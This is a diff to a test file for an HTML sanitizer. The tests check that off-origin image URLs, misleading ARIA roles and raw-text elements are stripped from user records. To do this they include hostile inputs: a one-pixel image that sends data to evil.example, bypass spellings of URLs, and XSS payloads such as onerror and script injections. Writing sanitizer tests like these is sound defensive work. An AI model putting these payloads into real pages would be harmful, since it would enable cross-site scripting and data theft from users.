@@ -36,9 +36,11 @@ describe("enforcer — accept path", () => {
   });
 
   test("a media frame with an image field passes through unchanged", () => {
+    // Same-origin, because a record never reaches off this origin — see the off-origin
+    // cases below.
     const markup =
       '<figure class="media-frame media-frame--wide">' +
-      '<img src="https://ex.com/p.jpg" alt="a photo" loading="lazy">' +
+      '<img src="/media/p.jpg" alt="a photo" loading="lazy">' +
       "</figure>";
     expect(enforceItemMarkup(markup)).toBe(markup);
   });
@@ -50,8 +52,23 @@ describe("enforcer — accept path", () => {
   });
 
   test("safe aria and title attributes are preserved", () => {
-    const markup = '<span role="img" aria-label="star" title="rating">★</span>';
+    const markup = '<span aria-label="star" title="rating">★</span>';
     expect(enforceItemMarkup(markup)).toBe(markup);
+  });
+
+  // A record *is* a `<button>` and opening it is the only thing it does, so the semantics
+  // of the item are the platform's. A `role` inside one can only make it lie, and
+  // `aria-hidden` can take the record's own text away from a reader who cannot see it.
+  test("a record may not redeclare what it is, or hide itself from a screen reader", () => {
+    for (const attribute of ['role="button"', 'role="link"', 'role="img"', 'aria-hidden="true"']) {
+      const output = enforceItemMarkup(`<span ${attribute}>text</span>`);
+
+      expect(output, attribute).toBe("<span>text</span>");
+    }
+    // Every other `aria-*` still describes the content, which is what they are for.
+    expect(enforceItemMarkup('<span aria-label="star">★</span>')).toBe(
+      '<span aria-label="star">★</span>',
+    );
   });
 
   test("inline data:image URLs on a media field are preserved", () => {
@@ -224,6 +241,55 @@ describe("enforcer — scripts and event handlers", () => {
   });
 });
 
+// A record may not make the browser fetch from somewhere else. The `url(...)` ban in
+// `style-discipline.ts` exists for exactly this reason, and leaving `<img src>` open made
+// it half a rule: a one-pixel remote image carrying record fields in its query string
+// passed the design-lint rung clean and survived enforcement byte-identically.
+describe("enforcer — a record never reaches off this origin", () => {
+  test("drops a remote media URL while keeping the element and its other attributes", () => {
+    const output = enforceItemMarkup(
+      '<img src="https://evil.example/px.gif?d=secret" alt="x" width="1">',
+    );
+
+    expect(output).not.toContain("evil.example");
+    expect(output).toContain('alt="x"');
+    expect(output).toContain('width="1"');
+  });
+
+  test("drops every off-origin spelling", () => {
+    for (const url of [
+      "https://evil.example/p.gif",
+      "http://evil.example/p.gif",
+      "//evil.example/p.gif",
+      "HTTPS://EVIL.EXAMPLE/p.gif",
+      "https:/\u200b/evil.example/p.gif",
+      "ftp://evil.example/p.gif",
+      "blob:https://evil.example/x",
+    ]) {
+      expect(enforceItemMarkup(`<img src="${url}" alt="x">`), url).not.toContain("evil.example");
+    }
+  });
+
+  test("sees every candidate in a srcset, not just the first", () => {
+    const output = enforceItemMarkup(
+      '<img src="/a.png" srcset="/a.png 1x, https://evil.example/b.png 2x" alt="x">',
+    );
+
+    expect(output).not.toContain("evil.example");
+    expect(output).toContain('src="/a.png"');
+  });
+
+  test("keeps the two addresses a record legitimately holds", () => {
+    const inline = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="x">';
+    const relative = '<img src="/media/p.jpg" alt="x">';
+    const bare = '<img src="p.jpg" alt="x">';
+
+    expect(enforceItemMarkup(inline)).toBe(inline);
+    expect(enforceItemMarkup(relative)).toBe(relative);
+    expect(enforceItemMarkup(bare)).toBe(bare);
+  });
+});
+
 describe("enforcer — interactive descendants", () => {
   test("unwraps a link, keeping its text and dropping its href", () => {
     expect(enforceItemMarkup('<a href="javascript:evil()">click</a>')).toBe("click");
@@ -345,5 +411,44 @@ describe("enforcer — a repeated attribute collapses to the copy a browser hono
   test("markup with no repeated attribute is untouched", () => {
     const markup = '<div class="stack" style="color: var(--ink)"><span>x</span></div>';
     expect(enforceItemMarkup(markup)).toBe(markup);
+  });
+});
+
+// A raw-text/RCDATA element's content is *text*, never markup, so the parser never offers
+// its children to the element handler. Unwrapping such an element therefore re-emits that
+// text into the output as markup — turning an inert payload into a live one, which is the
+// exact opposite of what this enforcer promises. They leave with their content instead.
+describe("enforcer — a raw-text element cannot launder its content into markup", () => {
+  test("an RCDATA element is removed with everything inside it", () => {
+    for (const markup of [
+      "<textarea><img src=x onerror=alert(1)></textarea>",
+      "<textarea><script>alert(1)</script></textarea>",
+      "<TEXTAREA><img src=x onerror=alert(1)></TEXTAREA>",
+      "<noembed><img src=x onerror=alert(1)></noembed>",
+    ]) {
+      expect(enforceItemMarkup(markup), markup).toBe("");
+    }
+
+    expect(
+      enforceItemMarkup(
+        '<div class="stack"><textarea><img src=x onerror=alert(1)></textarea></div>',
+      ),
+    ).toBe('<div class="stack"></div>');
+  });
+
+  // The property that catches the next one of these without anybody thinking of it: a
+  // pass that changes what a second pass would change was, by definition, shipped live.
+  test("enforcing is idempotent across every hostile case", () => {
+    for (const markup of [
+      "<textarea><img src=x onerror=alert(1)></textarea>",
+      "<noembed><script>alert(1)</script></noembed>",
+      "<div class='stack'><textarea><iframe src='javascript:alert(1)'></iframe></textarea></div>",
+      "<script>alert(1)</script>",
+      "<svg><script>alert(1)</script></svg>",
+      "<div class='stack'><p>ordinary</p></div>",
+    ]) {
+      const once = enforceItemMarkup(markup);
+      expect(enforceItemMarkup(once), markup).toBe(once);
+    }
   });
 });
